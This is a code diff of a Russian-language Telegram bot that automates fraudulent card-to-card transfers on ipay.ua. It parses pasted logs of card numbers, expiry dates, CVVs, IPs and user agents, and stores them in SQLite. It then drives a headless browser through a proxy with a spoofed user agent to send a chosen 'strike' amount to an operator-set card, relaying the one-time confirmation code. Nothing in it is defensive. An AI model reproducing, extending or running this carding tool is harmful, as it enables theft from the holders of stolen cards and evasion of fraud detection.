@@ -2,6 +2,7 @@ import os
 import re
 import sqlite3
 import asyncio
+import random
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -14,7 +15,6 @@ import threading
 # ===================== КОНФИГ =====================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-DEFAULT_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
 DB_PATH = "/var/data/sessions.db"
 
 # ===================== FLASK ДЛЯ ПИНГА =====================
@@ -37,10 +37,7 @@ dp.middleware.setup(LoggingMiddleware())
 # ===================== КНОПКИ МЕНЮ =====================
 def get_main_menu():
     kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.add(
-        KeyboardButton("🏠 Главное меню"),
-        KeyboardButton("⚙️ Админ-панель")
-    )
+    kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
     return kb
 
 # ===================== БАЗА ДАННЫХ =====================
@@ -55,8 +52,7 @@ def init_db():
         amount INTEGER,
         card_to TEXT,
         status TEXT,
-        msg_amount_id INTEGER,
-        msg_code_id INTEGER,
+        msg_id INTEGER,
         timestamp TEXT
     )""")
     c.execute("""CREATE TABLE IF NOT EXISTS settings (
@@ -65,7 +61,6 @@ def init_db():
     )""")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
-    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_ua', ?)", (DEFAULT_UA,))
     conn.commit()
     conn.close()
 
@@ -84,14 +79,14 @@ def set_setting(key, value):
     conn.commit()
     conn.close()
 
-def create_session(data):
+def create_session(data, msg_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     c.execute("""INSERT INTO sessions
-        (card_from, expiry, cvv, ip, user_agent, amount, card_to, status, timestamp)
+        (card_from, expiry, cvv, ip, user_agent, card_to, status, msg_id, timestamp)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
         (data['card'], data['expiry'], data['cvv'], data['ip'],
-         data['user_agent'], None, get_setting('card_to'), 'waiting_amount', datetime.now().isoformat()))
+         data['user_agent'], get_setting('card_to'), 'waiting_amount', msg_id, datetime.now().isoformat()))
     session_id = c.lastrowid
     conn.commit()
     conn.close()
@@ -104,6 +99,14 @@ def update_session(session_id, field, value):
     conn.commit()
     conn.close()
 
+def get_session_by_msg(msg_id):
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT * FROM sessions WHERE msg_id = ? AND status IN ('waiting_amount', 'waiting_code')", (msg_id,))
+    row = c.fetchone()
+    conn.close()
+    return row
+
 def get_session(session_id):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
@@ -114,10 +117,7 @@ def get_session(session_id):
 
 # ===================== ПАРСЕР ЛОГА =====================
 def parse_log(text):
-    data = {
-        "card": None, "expiry": None, "cvv": None,
-        "ip": None, "user_agent": None
-    }
+    data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
     lines = text.split("\n")
     for line in lines:
         if "Номер:" in line or "💳" in line:
@@ -135,30 +135,21 @@ def parse_log(text):
         if "User-Agent:" in line or "👻" in line:
             parts = line.split(":", 1)
             if len(parts) > 1: data["user_agent"] = parts[1].strip()
-    if not data["ip"]: data["ip"] = get_setting('proxy')
-    if not data["user_agent"]: data["user_agent"] = get_setting('default_ua')
+    if not data["ip"]: data["ip"] = get_setting('proxy') or "auto"
+    if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
     return data
 
-# ===================== ЭМУЛЯЦИЯ ПЛАТЕЖА (iPay) =====================
+# ===================== ЭМУЛЯЦИЯ ПЛАТЕЖА =====================
 async def emulate_payment(session_id, code=None):
     session = get_session(session_id)
-    if not session:
-        return "Сессия не найдена"
+    if not session: return "Сессия не найдена"
     card, expiry, cvv, ip, ua, amount, card_to = session[1], session[2], session[3], session[4], session[5], session[6], session[7]
     expiry = expiry.replace("/", "").strip()
-    if len(expiry) == 4:
-        expiry = expiry[:2] + "/" + expiry[2:]
+    if len(expiry) == 4: expiry = expiry[:2] + "/" + expiry[2:]
     proxy = get_setting('proxy')
     async with async_playwright() as p:
-        browser = await p.chromium.launch(
-            headless=True,
-            proxy={"server": proxy} if proxy else None
-        )
-        context = await browser.new_context(
-            user_agent=ua or get_setting('default_ua'),
-            locale="uk-UA",
-            timezone_id="Europe/Kyiv"
-        )
+        browser = await p.chromium.launch(headless=True, proxy={"server": proxy} if proxy else None)
+        context = await browser.new_context(user_agent=ua or "Mozilla/5.0 (Linux; Android 10)", locale="uk-UA", timezone_id="Europe/Kyiv")
         page = await context.new_page()
         await page.goto("https://ipay.ua/card2card")
         await page.fill('input[name="card_from"]', card)
@@ -167,7 +158,7 @@ async def emulate_payment(session_id, code=None):
         await page.fill('input[name="card_to"]', card_to)
         await page.fill('input[name="amount"]', str(amount))
         await page.click('button[type="submit"]')
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
         if await page.is_visible('input[name="code"]'):
             if code:
                 await page.fill('input[name="code"]', code)
@@ -193,33 +184,23 @@ async def start_cmd(msg: types.Message):
 @dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
 async def main_menu(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
-    await msg.reply("🏠 Главное меню. Отправьте лог с данными карты или нажмите 'Админ-панель'.", reply_markup=get_main_menu())
+    await msg.reply("🏠 Главное меню. Отправьте лог.", reply_markup=get_main_menu())
 
 @dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
 async def admin_panel_button(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
-    await show_admin_panel(msg)
-
-@dp.message_handler(commands=['admin'])
-async def admin_panel_cmd(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID: return
-    await show_admin_panel(msg)
-
-async def show_admin_panel(msg: types.Message):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("💳 Сменить карту", callback_data="change_card"),
-        InlineKeyboardButton("💰 Сменить сумму", callback_data="change_amount"),
         InlineKeyboardButton("🔄 Сменить прокси", callback_data="change_proxy"),
         InlineKeyboardButton("📋 Статус", callback_data="show_status"),
-        InlineKeyboardButton("📋 Логи", callback_data="show_logs"),
     )
     await msg.reply("🏦 Админ-панель", reply_markup=kb)
 
 @dp.callback_query_handler(lambda c: c.data.startswith("change_"))
 async def settings_callback(callback: types.CallbackQuery):
     action = callback.data.split("_")[1]
-    prompts = {"card": "Введите новый номер карты получателя:", "amount": "Введите новую сумму по умолчанию (UAH):", "proxy": "Введите новый прокси (формат socks5://user:pass@ip:port):"}
+    prompts = {"card": "Введите новый номер карты получателя:", "proxy": "Введите новый прокси (socks5://user:pass@ip:port):"}
     await callback.message.reply(prompts.get(action, "Ошибка"))
     await callback.answer()
 
@@ -227,69 +208,62 @@ async def settings_callback(callback: types.CallbackQuery):
 async def show_status(callback: types.CallbackQuery):
     card = get_setting('card_to') or "не задана"
     proxy = get_setting('proxy') or "не задан"
-    await callback.message.reply(f"📊 Текущие настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}")
+    await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}")
     await callback.answer()
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
-async def handle_reply_input(msg: types.Message):
+async def handle_reply(msg: types.Message):
     text = msg.reply_to_message.text
     user_input = msg.text.strip()
 
-    # === ЛОГИКА ЗАПУСКА ПЛАТЕЖА (приоритет) ===
+    # Если ответ на запрос суммы
     if "сумму удара" in text:
         if not user_input.isdigit():
             await msg.reply("❌ Введи число!")
             return
         amount = int(user_input)
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute("SELECT id FROM sessions WHERE msg_amount_id = ? AND status = 'waiting_amount'", (msg.reply_to_message.message_id,))
-        row = c.fetchone()
-        conn.close()
-        if not row:
+        # Ищем сессию по msg_id сообщения, на которое отвечаем
+        session = get_session_by_msg(msg.reply_to_message.message_id)
+        if not session:
             await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
             return
-        session_id = row[0]
+        session_id = session[0]
         update_session(session_id, 'amount', amount)
         update_session(session_id, 'status', 'processing')
-        await msg.reply(f"🚀 Начинаю эмуляцию платежа на {amount} UAH...")
+        await msg.reply(f"🚀 Начинаю платёж на {amount} UAH...")
         result = await emulate_payment(session_id)
         if result == "waiting_code":
             update_session(session_id, 'status', 'waiting_code')
-            code_msg = await msg.reply("🔐 Введите 6-значный код (ответьте на это сообщение):")
-            update_session(session_id, 'msg_code_id', code_msg.message_id)
+            code_msg = await msg.reply("🔐 Введите 6-значный код (ответьте):")
+            update_session(session_id, 'msg_id', code_msg.message_id)
         else:
             update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
             await msg.reply(result)
         return
 
-    # === НАСТРОЙКИ (менее приоритетно) ===
-    if "номер карты" in text:
-        set_setting('card_to', user_input)
-        await msg.reply("✅ Карта получателя обновлена!")
-    elif "сумму по умолчанию" in text and user_input.isdigit():
-        set_setting('default_amount', user_input)
-        await msg.reply(f"✅ Сумма по умолчанию: {user_input} UAH")
-    elif "прокси" in text:
-        set_setting('proxy', user_input)
-        await msg.reply("✅ Прокси обновлён!")
-    elif "код" in text:
+    # Если ответ на запрос кода
+    if "код" in text:
         if not user_input.isdigit() or len(user_input) != 6:
-            await msg.reply("❌ Код должен быть 6 цифр!")
+            await msg.reply("❌ 6 цифр!")
             return
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute("SELECT id FROM sessions WHERE msg_code_id = ? AND status = 'waiting_code'", (msg.reply_to_message.message_id,))
-        row = c.fetchone()
-        conn.close()
-        if not row:
+        session = get_session_by_msg(msg.reply_to_message.message_id)
+        if not session:
             await msg.reply("❌ Сессия не найдена.")
             return
-        session_id = row[0]
-        await msg.reply("🔄 Подтверждаю платёж...")
+        session_id = session[0]
+        await msg.reply("🔄 Подтверждаю...")
         result = await emulate_payment(session_id, user_input)
         update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
         await msg.reply(result)
+        return
+
+    # Настройки
+    if "номер карты" in text:
+        set_setting('card_to', user_input)
+        await msg.reply("✅ Карта обновлена!")
+    elif "прокси" in text:
+        set_setting('proxy', user_input)
+        await msg.reply("✅ Прокси обновлён!")
 
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
 async def handle_log(msg: types.Message):
@@ -297,14 +271,10 @@ async def handle_log(msg: types.Message):
     if not data["card"] or not data["expiry"] or not data["cvv"]:
         await msg.reply("❌ Не удалось распознать данные.")
         return
-    session_id = create_session(data)
-    update_session(session_id, 'msg_amount_id', msg.message_id)
+    session_id = create_session(data, msg.message_id)
     await msg.reply(
-        f"✅ Данные распознаны:\n"
-        f"💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
-        f"📅 Срок: {data['expiry']}\n"
-        f"🎳 CVV: ***\n"
-        f"🌍 IP: {data['ip']}\n"
+        f"✅ Данные распознаны:\n💳 Карта: {data['card'][:4]}****{data['card'][-4:]}\n"
+        f"📅 Срок: {data['expiry']}\n🎳 CVV: ***\n🌍 IP: {data['ip']}\n"
         f"👻 UA: {data['user_agent'][:30]}...\n\n"
         f"💰 Введите сумму удара (ответьте на это сообщение):"
     )
